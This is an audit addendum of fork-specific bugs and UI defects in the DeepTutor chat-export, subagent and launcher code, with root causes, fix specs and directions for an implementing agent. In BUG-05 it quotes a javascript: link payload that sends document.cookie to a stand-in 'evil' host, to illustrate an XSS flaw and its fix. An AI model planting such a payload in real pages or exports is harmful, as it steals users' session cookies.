# DeepTutor — Fork Audit Addendum A: Bugs, Concurrency & UI

**Scope:** ONLY the fork's own additions versus upstream `v1.7.3`. Upstream code is out of scope.
**Delta basis:** `git diff v1.7.3..HEAD` — 78 files, ~8,050 insertions.
**Audited at:** commit `a9d8af3d3` (branch `sync/v1.7.3`).
**Audit date:** 2026-11-19.

> **STATUS (2026-11-19):** every defect and UI item below is fixed on `sync/v1.7.3`. Two were resolved by an alternate route: BUG-03 (non-Latin PDF) routes the conversation to the vector print path rather than embedding a Unicode font, and BUG-14 received payload validation without an added origin guard. Decisions and deliberate non-goals are recorded in `docs/DECISIONS_AND_TRAPS.md` under "Fork Audit Remediation".

> **For the implementing agent:** fix in the order given. Every item below is a defect in *fork-authored* code, not upstream. Do not "fix" these by deleting the feature — each one has a specific repair. After each change, run the gates listed at the end of this file.

## Fork feature surface under audit

| Subsystem | Entry points | Size |
| --- | --- | --- |
| Export engine | `web/lib/export/*`, `web/features/export/ExportChatModal.tsx` | ~3,765 lines |
| Legacy chat export | `web/lib/chat-export.ts` | 94 lines |
| Model preferences | `deeptutor/services/subagent/model_preferences.py`, `deeptutor/api/routers/settings.py` | 87 + routes |
| Command Code backend | `deeptutor/services/subagent/command_code.py` | 190 lines |
| Windows launcher | `deeptutor/runtime/launcher.py` (`_python_interpreter`, `_launch_detached`) | ~18 lines changed |
| CLI app installs | `deeptutor/services/cli_apps/installer.py` (`_steps`) | ~20 lines changed |
| LaTeX deltas | `web/lib/latex.ts`, `web/lib/latex-normalize.ts`, `web/lib/markdown-display.ts` | ~16 lines |

---

## Part 1 — Logic, Data & Concurrency

### BUG-01 — Duplicate tables in every DOCX and PDF export
- **Severity:** High (visible corruption in the flagship feature)
- **Files & symbols:**
  - `web/lib/export/adapter.ts` → `extractMarkdownTables`
  - Consumers: `web/lib/export/docx-builder.ts` → table block (`options.includeTables && msg.tables?.length`); `web/lib/export/pdf-builder.ts` → `autoTable` block
- **Root cause:** `extractMarkdownTables` builds `nonTableLines`, then throws it away and returns `cleanedText: text` (the *original* string). So `msg.content` still contains the pipe-delimited table, and the builder renders it twice: once as literal `| Name | Score |` text paragraphs, once as a native table from `msg.tables`.
- **Evidence:** `nonTableLines` is written at one line and read nowhere; `cleanedText` is destructured nowhere in the codebase.
- **Fix spec:**
  1. In `extractMarkdownTables`, return `cleanedText: nonTableLines.join("\n")`.
  2. Preserve original blank-line spacing so paragraph breaks survive (`nonTableLines` currently pushes raw lines, which is fine, but collapse runs of >2 empty lines only if that matches prior output).
  3. Make the scanner fence-aware before splitting on `|` (see BUG-18) so a table inside a ```` ``` ```` block is never hoisted.
  4. In `docx-builder.ts` and `pdf-builder.ts`, render `msg.content` (now table-free) *and* `msg.tables` — no other change needed.
  5. Update `web/tests/lib/chat-export-suite.spec.ts` → `"extracts Markdown tables into structured headers and rows"` to also assert `cleanedText` no longer contains `"| Name |"`.
- **Regression test:** export a message containing one table; assert the DOCX body contains exactly one `<w:tbl>` and zero `w:t` runs starting with `|`.

### BUG-02 — Non-zero subagent exit is reported as success
- **Severity:** High (silent false success)
- **Files & symbols:** `deeptutor/services/subagent/command_code.py` → `CommandCodeBackend.consult`, the `if channel == "exit"` branch; `deeptutor/services/subagent/types.py` → `ConsultResult.success`
- **Root cause:** `ConsultResult.success` defaults to `True`. The error branch is guarded by:
  `if line != "0" and result.success and not result.final_text:`
  That means the error is recorded **only when the run already looks successful and produced no text**. Two failure modes escape:
  - CLI streams partial text, then exits non-zero → `result.final_text` is set → no error, `success` stays `True`.
  - CLI emits a `result` payload with `subtype != "success"` (sets `success = False`), then exits non-zero → `result.success` is now `False`, so the guard short-circuits and **`error` is never populated**.
- **Fix spec:** restructure the exit branch to a single unconditional failure path:
  ```
  on exit:
    if returncode == 0: continue
    if effort-fallback condition matches: retry once with effort=""  (existing behaviour, keep first)
    result.success = False
    if not result.error: result.error = f"cmdc exited with code {rc}" + (f": {stderr}" if stderr)
    emit(EVENT_ERROR, result.error, {...})
  ```
  Do not gate failure recording on `final_text` or on the prior `success` value. Keep partial text — the user should still see what arrived.
- **Also:** `success` should arguably default to `False` and be set `True` only on a clean exit; if you change it, audit the other backends that share `ConsultResult` before touching it.

### BUG-03 — PDF export renders non-Latin text as tofu boxes
- **Severity:** High (feature unusable for zh/ja/ko/ru users)
- **Files & symbols:** `web/lib/export/pdf-builder.ts` → `buildPdfBlob`, all `doc.setFont("helvetica"|"courier", …)` calls
- **Root cause:** jsPDF's 14 standard fonts are Latin-1/WinAnsi only. The app ships 11 locales including `zh`, `ja`, `ko`, `ru`. Every CJK/Cyrillic codepoint handed to `doc.text()` falls off the encoding and comes back as `□`. This is documented behaviour, not a bug in the call.
- **Impact:** assistant answers, code comments, citation titles, and workspace names in those scripts are unreadable in the jsPDF output.
- **Fix spec (choose one, in order of preference):**
  1. **Preferred:** make the browser-print path (`printPublicationPdf`) the primary "PDF" export. It typesets with the browser's own fonts and KaTeX, so every script and every equation already renders correctly and stays vector. Then relabel the jsPDF path as "PDF (Latin only)" or delete it.
  2. Otherwise register a subsetted Unicode TTF via `doc.addFont()` at export time, pick the font per text run by codepoint coverage, and fall back to helvetica for Latin.
  3. In both cases, fix line breaking: `splitTextToSize` does not break between CJK characters, so long CJK paragraphs overflow horizontally. Add a break-anywhere pass for ranges `U+3040–U+30FF`, `U+3400–U+4DBF`, `U+4E00–U+9FFF`, `U+AC00–U+D7AF`.

### BUG-04 — Long code blocks and long prompts are silently clipped in PDF
- **Severity:** High (content loss with no warning)
- **Files & symbols:** `web/lib/export/pdf-builder.ts` → `checkPageBreak`, the code-block branch, and the user prompt card branch
- **Root cause:** `checkPageBreak(blockHeight + 4)` adds **at most one** page, then `doc.text(codeLines, …)` draws all remaining lines from `y`. Any block taller than one page body spills past the page bottom and jsPDF discards it without error. Same for `promptLines` in the tinted user card.
- **Fix spec:** implement real pagination:
  - Compute `linesPerPage = floor((pageHeight - 2*margin - footerReserve) / lineHeight)`.
  - Slice `codeLines` / `promptLines` into chunks of `linesPerPage`; draw the card background and border per chunk; `doc.addPage()` between chunks.
  - For the user card, recompute `cardHeight` per chunk instead of once.
- **Regression test:** export a message with a 400-line code block; assert the produced PDF page count grows and the final line of code appears on the last page (string-search the extracted text).

### BUG-05 — `javascript:` URLs survive into exported HTML
- **Severity:** Medium-High (stored XSS in a file the user shares)
- **Files & symbols:** `web/lib/export/html-builder.ts` → source list (`<a href="${escapeHtml(src.url)}"`), artifacts list (`art.url`)
- **Root cause:** `escapeHtml` neutralises markup characters but not URL schemes. `src.url` comes from web-search/RAG results, i.e. untrusted input. `href="javascript:fetch('//evil/'+document.cookie)"` executes when the exported file is opened and the link clicked.
- **Fix spec:** add `safeHref(url: string): string | null` that parses with `new URL()` and returns the href only for `http:`/`https:`/`mailto:`; otherwise return `null` and render the raw URL as inert `<span>` text. Apply to `src.url` and `art.url`. Add a unit test with `javascript:alert(1)` and `data:text/html;base64,…`.

### BUG-06 — Export selection goes stale between modal opens
- **Severity:** High (empty or partial export with no explanation)
- **Files & symbols:** `web/features/export/ExportChatModal.tsx` → `selectedIds` `useState` initializer, `handleToggleMessage`, `stats`; the `if (!open) return null` early return
- **Root cause:** the component stays mounted while closed (it returns `null` but keeps state). `selectedIds` is seeded once from the first `normalizedList` and never resynchronised. Consequences:
  - Open in session A, deselect two messages, close, open session B → selection still holds session A ids. `stats.selectedCount` counts only ids present in the new list, so the footer reads `0 / 40 selected` while `handleExport` computes an empty filter and either exports nothing or (if all ids are stale) throws the "select at least one message" error.
  - New messages arriving while the modal is open are never added to the selection even though the user never deselected anything.
- **Fix spec:** add
  ```
  useEffect(() => {
    if (!open) return;
    setSelectedIds(new Set(normalizedList.map(m => m.id)));
    setLastClickedIndex(null);
    setExpandedPreviewIds(new Set());
  }, [open, messages]);
  ```
  Depend on `messages` (identity) rather than `normalizedList` to avoid a loop. If per-session selection should persist, key the state by `sessionId` instead.
- **Regression test:** render, open with 3 messages, deselect one, change `messages` to a 5-message array, reopen, assert all 5 are selected.

### BUG-07 — Legacy markdown download revokes its object URL too early
- **Severity:** Medium (intermittent failed download)
- **Files & symbols:** `web/lib/chat-export.ts` → `downloadChatMarkdown`
- **Root cause:** `anchor.click()` is followed immediately by `URL.revokeObjectURL(url)`. WebKit and Firefox may not have started reading the blob yet, so the download silently fails. `web/lib/export/exporter.ts` → `triggerDownload` already does this correctly with a deferred revoke.
- **Fix spec:** delete `downloadChatMarkdown` and `buildChatMarkdown`'s duplicate `sanitizeFilename`, and route every caller through `exportSession(..., "markdown", ...)` + `triggerDownload`. If a distinct formatting contract is genuinely required, keep the builder but delegate the download to `triggerDownload`.

### BUG-08 — Lost updates on model preferences (read-modify-write race)
- **Severity:** Medium (silent preference loss)
- **Files & symbols:**
  - `deeptutor/services/subagent/model_preferences.py` → `toggle_pin`, `toggle_hide`, `save_model_preferences`
  - `deeptutor/api/routers/settings.py` → `update_model_preferences`
- **Root cause:** three unguarded read-modify-write sequences over one JSON file.
  - Two tabs toggling *different* models interleave `load → mutate → save`; the second write drops the first change.
  - `PUT /model-preferences` replaces the whole document, clobbering any toggle that lands concurrently.
  - `path.with_suffix(".tmp")` gives every writer the **same** temp filename, so concurrent writers can interleave into one temp file before `replace()`.
- **Fix spec:**
  1. Guard every mutation with a process-wide `threading.Lock` (the service is sync and called from async routes — either keep it sync and call it via `asyncio.to_thread`, or convert to `async` + `asyncio.Lock`; do not hold a sync lock across `await`).
  2. Write to a unique temp file: `tempfile.mkstemp(dir=path.parent)` then `os.replace`.
  3. Make `PUT /model-preferences` a merge of provided fields (`exclude_unset=True`) rather than a wholesale replace.

### BUG-09 — Preferences file is unvalidated; malformed data changes semantics
- **Severity:** Medium
- **Files & symbols:** `model_preferences.py` → `load_model_preferences`, `is_pinned`, `is_hidden`, `toggle_pin`, `toggle_hide`
- **Root cause:** `json.load` result is trusted. If a hand-edit (the feature's whole selling point is "human-editable JSON") produces `{"pinned": "gpt-5"}`, then `name in pinned` becomes **substring matching** and `pinned.remove(x)` on a `str` raises or no-ops. If the file is a list, `.get` raises `AttributeError`.
- **Fix spec:** add `_coerce(raw) -> dict` that returns `{"display_names": dict, "pinned": list, "hidden": list}`, dropping non-string entries and non-list containers, logging once at WARNING. Share the shape with the router via a single Pydantic model, and use it in `save_model_preferences` too (so the API can never persist an invalid shape).

### BUG-10 — Relative fallback path for the preferences file
- **Severity:** Medium (data written to an unexpected directory)
- **Files & symbols:** `model_preferences.py` → `_SETTINGS_FILE`
- **Root cause:** `Path("data/user/settings/model_preferences.json")` is cwd-relative. `_get_settings_path()` falls back to it whenever the runtime settings service raises. Launched from a different working directory (desktop app, scheduled task, `deeptutor` invoked elsewhere), preferences land in the wrong tree and appear to reset.
- **Fix spec:** derive the fallback from the same data-root helper the runtime settings service uses (resolve against the package/app root), never a bare relative path. Add a startup log line printing the resolved preferences path at INFO.

### BUG-11 — `_session_exists` blocks the event loop on every consult
- **Severity:** Medium
- **Files & symbols:** `deeptutor/services/subagent/command_code.py` → `CommandCodeBackend._session_exists`, called from `_build_command`
- **Root cause:** synchronous `Path.exists()`, `iterdir()`, and `glob()` over `~/.commandcode/projects/*` run inside an `async def`, on every consult. Cost grows with project count and with number of `.jsonl` files per project. On Windows a locked or permission-denied directory raises `OSError` and aborts the whole consult.
- **Fix spec:** wrap the scan in `await asyncio.to_thread(...)`, wrap the body in `try/except OSError` returning `False`, and cache results in a small dict keyed by `sid` with a short TTL (e.g. 30 s) or invalidate on new-session creation. Cap iterations (e.g. 200 files) and stop scanning once a match is found.

### BUG-12 — Long prompts passed as a single argv element
- **Severity:** Medium (hard failure on Windows)
- **Files & symbols:** `command_code.py` → `_build_command` (`cmd = [self.cli_command, "-p", question, ...]`)
- **Root cause:** Windows `CreateProcess` caps the command line near 32K characters. A pasted lecture, a long worksheet, or accumulated context exceeds it; the spawn fails and the user sees an opaque OS error instead of "prompt too large".
- **Fix spec:** detect the limit before spawning (`len(" ".join(cmd)) > 30000` on `win32`). Prefer writing the prompt to a temp file and using the CLI's file/stdin input flag if it has one. Otherwise fail fast with a clear, translated message. Also catch `OSError` with `winerror == 206` and map it to the same message.

### BUG-13 — Unbounded process-output queue
- **Severity:** Medium (memory growth on a runaway subagent)
- **Files & symbols:** `deeptutor/services/subagent/process.py` → `stream_process_lines` (`queue: asyncio.Queue()`)
- **Root cause:** no `maxsize`. A CLI that floods stdout (looping tool, huge JSON frame, infinite retry) grows the queue without bound while the renderer drains at UI speed. `stderr_lines` in `command_code.py` is likewise unbounded.
- **Fix spec:** `asyncio.Queue(maxsize=2048)` — `await queue.put(...)` already applies backpressure, which will throttle the pump and ultimately the child via the OS pipe buffer. Separately bound `stderr_lines` (e.g. keep the last 200 lines and a total byte cap).

### BUG-14 — Model preference endpoints lack size and origin guards
- **Severity:** Medium (resource abuse, CSRF surface)
- **Files & symbols:** `deeptutor/api/routers/settings.py` → `ModelPreferencesPayload`, `TogglePreferenceRequest`, `get_model_preferences`, `update_model_preferences`, `toggle_model_pin`, `toggle_model_hide`
- **Root cause:** `display_names: dict[str, str]` is unbounded in both count and value length; `name: str` is unconstrained (empty string allowed, which then appears as a phantom pinned entry); mutations carry no same-origin check while the rest of the API has one.
- **Fix spec:** constrain with `Field(min_length=1, max_length=200)` on `name`; bound `display_names` (e.g. `max_length=2000` entries, value `max_length=200`) via a `field_validator`; require the same origin/CSRF guard the other mutating routes use; reject whitespace-only names.

### BUG-15 — Print-PDF leaks an iframe and can blank an in-progress print
- **Severity:** Medium
- **Files & symbols:** `web/lib/export/exporter.ts` → `printPublicationPdf`
- **Root cause:** two issues.
  1. `if (!frameDoc) return;` leaves the just-appended iframe in the DOM forever.
  2. The cleanup is a fixed `setTimeout(..., 60000)`. If the user leaves the print dialog open longer, the frame is removed mid-job and the preview/print can go blank. Conversely the fixed `450 ms` delay before `print()` can fire before KaTeX fonts settle on a slow machine, printing unrendered math.
- **Fix spec:** remove the frame on `afterprint` (with a generous fallback timer), and remove it on every early return. Replace the fixed pre-print delay with a readiness signal: wait for `iframe.contentDocument.fonts.ready` **and** a KaTeX-done marker (e.g. poll until `document.querySelectorAll('.katex').length` equals a count written into the HTML, or have `buildPublicationHtml` set `window.__ready = true`), with a 5 s timeout.

### BUG-16 — OMML drops accents and over/under structures
- **Severity:** Medium (Word export fidelity vs the documented claim)
- **Files & symbols:** `web/lib/export/omml.ts` → `ACCENTS` (declared, never referenced), `convert`
- **Root cause:** `convert` handles `mi/mn/mo/mtext/mfrac/msqrt/mroot/msup/msub/msubsup/mtable/mfenced` and falls through to child concatenation for anything else. KaTeX emits `mover`/`munder`/`munderover` for `\hat`, `\bar`, `\overline`, `\vec`, `\dot`, and for stacked limits — all of which lose their structure, yielding `x^` instead of x̂ and collapsing `lim` limits into inline text. The `ACCENTS` map was clearly written for this and never wired up.
- **Fix spec:** add handlers:
  - `mover` → if the second child is a pure accent char in `ACCENTS`, emit `<m:acc><m:accPr><m:chr m:val="…"/></m:accPr><m:e>…</m:e></m:acc>`; otherwise `<m:limUpp>`.
  - `munder` → `<m:limLow>` (or `<m:bar>` when the operator is `¯`/`_`).
  - `munderover` → `<m:limLow>` wrapping `<m:limUpp>`.
  - `menclose` → fall back to its children (or `<m:borderBox>` if supported).
  - Use the existing `ACCENTS` map for the accent character; add tests for `\hat{x}`, `\bar{x}`, `\overline{AB}`, `\sum_{i=1}^{n}`, `\lim_{x\to0}`.

### BUG-17 — Unbounded MathML recursion can blow the stack
- **Severity:** Medium (export crash on adversarial or degenerate input)
- **Files & symbols:** `omml.ts` → `convert`
- **Root cause:** recursion depth is bounded only by the input tree. A model-generated formula with thousands of nested `mrow` (or a malicious paste) throws `RangeError: Maximum call stack size exceeded`, which surfaces as a generic "Export failed".
- **Fix spec:** thread a `depth` argument (default 0); at `depth > 60`, stop recursing and emit the node's `textContent` as one plain `run(...)`. Also cap total output length.

### BUG-18 — Table parsing breaks on escaped pipes and inside code fences
- **Severity:** Low-Medium
- **Files & symbols:** `web/lib/export/adapter.ts` → `extractMarkdownTables`; `web/lib/export/html-builder.ts` → `parseMarkdownTable` (duplicate logic)
- **Root cause:** cells are produced with `line.slice(1,-1).split("|")`, so `\|` splits a cell; and the scanner never tracks fenced-code state, so a table shown *as an example inside a code block* is extracted as a real table — then rendered as a native table in DOCX/PDF.
- **Fix spec:** one shared tokenizer in `adapter.ts` that (a) tracks ```` ``` ```` fences and skips their contents, (b) splits on `|` only when not preceded by an odd number of backslashes. Export it and delete `parseMarkdownTable`'s private copy.

### BUG-19 — Tool results can attach to the wrong tool call
- **Severity:** Low-Medium
- **Files & symbols:** `adapter.ts` → `normalizeMessages`, `tool_result` branch
- **Root cause:** when `call_id` is missing, the code attaches the result to "the last call without a result". With parallel tool calls, or results arriving out of order, this pairs a result with an unrelated invocation — visible in the exported "Tool Invocations" section.
- **Fix spec:** require an id match. If absent, emit the result as a standalone `ExportToolCall` with `name: "result"` (or a dedicated `observations` array) rather than guessing.

### BUG-20 — Display-math scanner can swallow prose
- **Severity:** Medium (rendering corruption after a malformed answer)
- **Files & symbols:** `web/lib/latex.ts` → `findDisplayClose`
- **Root cause:** the fork's change tolerates up to two blank lines inside a display block and only bails on a line starting with `#` or ```` ``` ````. If a model opens `$$` and never closes it, the scanner keeps consuming subsequent prose (headings are caught, but lists, blockquotes, tables, and rules are not) until it finds a `$$` — turning paragraphs into math.
- **Fix spec:** extend the bail-out set to list markers (`-`, `*`, `+`, `1.`), blockquote `>`, table rows starting `|`, and horizontal rules (`---`, `***`). Additionally cap the scan at ~200 lines after `start`.

### BUG-21 — Currency ranges are treated as inline math
- **Severity:** Low
- **Files & symbols:** `web/lib/markdown-display.ts` → `PROTECTED_SPAN_REGEX`, inline branch `\$(?!\s)(?:\\.|[^$\n])*?(?<!\s)\$`
- **Root cause:** `$5-$10` matches: the body is `5-`, and the character before the closing `$` is `-`, which satisfies `(?<!\s)`. The span is then protected from markdown processing and rendered as math.
- **Fix spec:** exclude a `$` immediately followed by a digit unless the body contains a LaTeX-ish character (`\`, `^`, `_`, `{`, `=`). Minimal version: add a negative lookahead `(?!\d)` right after the opening `$` when the body has no `\`, `^`, `_`, `{`, or `=`.

### BUG-22 — Duplicate `sanitizeFilename` with divergent fallbacks
- **Severity:** Low
- **Files & symbols:** `web/lib/export/exporter.ts` (fallback `"deeptutor-chat"`) and `web/lib/chat-export.ts` (fallback `"chat"`)
- **Fix spec:** export the one in `exporter.ts`, delete the other.

### BUG-23 — `close_fds=False` on Windows can hold ports and leak handles
- **Severity:** Low-Medium (intermittent "address already in use" after restart)
- **Files & symbols:** `deeptutor/runtime/launcher.py` → `_launch_detached` (`"close_fds": sys.platform != "win32"`)
- **Root cause:** with `close_fds=False` the child inherits every *inheritable* handle in the parent, including the listening socket. After the parent exits, the port can stay bound to the detached child and a restart fails to rebind.
- **Fix spec:** restore `close_fds=True` and rely on `CREATE_NO_WINDOW`/`DETACHED_PROCESS` (which already solve the console-flash problem this was meant to address). If one specific handle genuinely must be inherited, pass it explicitly via `handle_list` and keep `close_fds=True`.

### BUG-24 — CLI app install hardcodes a cwd-relative `.venv`
- **Severity:** Low-Medium (violates the project's own rule; silently uses the wrong interpreter)
- **Files & symbols:** `deeptutor/services/cli_apps/installer.py` → `_steps`
- **Root cause:** `os.path.join(os.getcwd(), ".venv", "Scripts", "python.exe")`. This is exactly the pattern `AGENTS.md` forbids ("never inline a venv path again"); it breaks when the server's cwd is not the project root, and it disagrees with `_env_bin_dir()`/`interpreter_path()`.
- **Fix spec:** use the shared interpreter helper. If a project venv must be preferred, resolve it from the package/app root (`Path(__file__).resolve().parents[…]`), never `os.getcwd()`.

### BUG-25 — No fallback when `uv` is present but failing
- **Severity:** Medium (install dead-end)
- **Files & symbols:** `installer.py` → `_steps`
- **Root cause:** the fork returns the `uv venv` + `uv pip install` plan whenever `shutil.which("uv")` succeeds. If `uv` is present but broken (corrupt env, unsupported Python, proxy issue) there is no venv+pip fallback, whereas the upstream plan always worked.
- **Fix spec:** return `[uv-plan, venv-plan]` as an ordered candidate list and have the executor fall through on failure; or probe `uv --version` once (short timeout) and cache the verdict.

---

## Part 2 — UI, Contrast & Interaction

### UI-01 — Pin/star glow fails contrast in light mode
- **Severity:** Medium (WCAG AA failure)
- **Files & symbols:** `web/components/chat/home/AnswerModeMenu.tsx` → pin toggle and both pinned-star indicators (`text-amber-400 fill-amber-400` with `drop-shadow-[0_0_6px_rgba(251,191,36,0.7)]`)
- **Root cause:** `amber-400` (#fbbf24) on white is ≈1.9:1 — well under the 3:1 floor for non-text UI icons. The glow makes it look brighter but does not add contrast; on a light panel it reads as a fuzzy yellow smudge.
- **Fix spec:** `text-amber-600 dark:text-amber-400` (+ matching `fill-amber-600 dark:fill-amber-400`); keep the glow only in dark mode, or reduce it to a 1 px ring.

### UI-02 — Hover makes the "hide" control lighter, and it fails contrast
- **Severity:** Medium
- **Files & symbols:** `AnswerModeMenu.tsx` → hidden-model drawer eye-off button (`text-rose-400 hover:text-rose-300`)
- **Root cause:** two problems. `rose-400` (#fb7185) on white is ≈2.0:1; and `hover` moves to `rose-300` (#fda4af, ≈1.6:1), i.e. the affordance gets *weaker* on hover — inverted from every other control in the app.
- **Fix spec:** `text-rose-600 hover:text-rose-700 dark:text-rose-400 dark:hover:text-rose-300`.

### UI-03 — Error text has no dark variant
- **Severity:** Medium (dark-theme contrast inversion)
- **Files & symbols:** `web/components/chat/home/ChatComposer.tsx` → submission-error banner (`text-red-600`), and the attachment-error state (`bg-red-500/15 text-red-500`)
- **Root cause:** `red-600` (#dc2626) is ~4.5:1 on white (passes) but ~3.4:1 on the dark surface (fails AA for 11 px text). No `dark:` counterpart exists.
- **Fix spec:** `text-red-600 dark:text-red-400`; for the pill, `bg-red-500/15 text-red-600 dark:text-red-400` plus `border-red-500/40` unchanged.

### UI-04 — Export modal is not keyboard accessible
- **Severity:** Medium (a11y + rough UX)
- **Files & symbols:** `web/features/export/ExportChatModal.tsx` → overlay `div onClick={onClose}`, collapse header `div onClick`, the checkbox `onChange={() => {}}`
- **Root cause:** no `role="dialog"`, no `aria-modal`, no `aria-labelledby`, no Escape handler, no focus trap, and the "Select Messages to Export" header is a clickable `div` (unreachable by keyboard, no `aria-expanded`). The checkbox is controlled with an empty `onChange` and toggled from `onClick`, which is fragile (and triggers a React controlled-input warning path in some setups).
- **Fix spec:** use the app's shared dialog primitive if one exists (upstream ships overlays — check `web/shared/ui/`). Otherwise: `role="dialog" aria-modal="true" aria-labelledby="export-title"`, Escape handler on the container, focus the close button on open, restore focus on close, trap Tab. Convert the picker header to `<button aria-expanded={showPicker}>`. Convert the checkbox to a real `onChange` handler and drop the `onClick` toggle (keep shift-click on the row only).

### UI-05 — Format labels are hardcoded English in 11 locales
- **Severity:** Low-Medium (i18n parity)
- **Files & symbols:** `ExportChatModal.tsx` → `FORMATS` (`label`, `description`), default `title = "Chat Session"`
- **Root cause:** `FORMATS` is a module constant with literal strings; only the surrounding chrome uses `t()`. The export feature added locale keys for its buttons but not for the seven format cards, so a Chinese user sees translated buttons next to "Microsoft Word / Editable Word doc with OMML math equations".
- **Fix spec:** move labels/descriptions to keys (`export.formats.docx.label` etc.) or pass them through `t()` at render time; add the keys to `web/locales/en/app.json` first, then the other 10 files (the fork's key-level merge convention).

### UI-06 — Modal layout under short viewports
- **Severity:** Low
- **Files & symbols:** `ExportChatModal.tsx` → `max-h-[92vh]`, the `flex-1 overflow-y-auto` body, `max-h-56` picker list, format grid `grid-cols-2 sm:grid-cols-3`
- **Root cause:** at ~1280×600 the body scrolls but the format grid (3 rows × ~76 px) plus the picker plus the 7 toggles overflow; the footer is not `shrink-0`, so in some flex configurations it compresses. `line-clamp-2` on the description needs Tailwind ≥3.3 (verify the version in `web/package.json` before relying on it).
- **Fix spec:** add `shrink-0` to the header and footer; verify at 1280×600 and 360×640; consider `grid-cols-1 min-[380px]:grid-cols-2 sm:grid-cols-3`.

### UI-07 — PDF table placement can push content off-page
- **Severity:** Low
- **Files & symbols:** `web/lib/export/pdf-builder.ts` → after `autoTable`, `y = ((doc as any).lastAutoTable?.finalY ?? y) + 6`
- **Root cause:** `finalY` is relative to the current page; if the table ends near the bottom, `+6` exceeds the usable area and the next block (sources, artifacts, separator) is drawn off-page. The `as any` also hides that jspdf-autotable v5 exposes the result differently.
- **Fix spec:** capture the return value of `autoTable(doc, …)` (v5 returns the table) or read `doc.lastAutoTable` with a typed interface; then `if (y > pageHeight - margin - 10) { doc.addPage(); y = margin; }`.

---

## Verification gates after every fix

```bash
.venv/Scripts/python.exe -m compileall -q deeptutor deeptutor_cli   # exit 0
cd web && npm run typecheck                                        # exit 0
cd web && npm run test:unit -- tests/lib/chat-export-suite.spec.ts  # export suite
```

Add regression tests for BUG-01, BUG-04, BUG-05, BUG-06 before declaring them fixed. Do not weaken the existing assertions in `chat-export-suite.spec.ts` to accommodate a change.
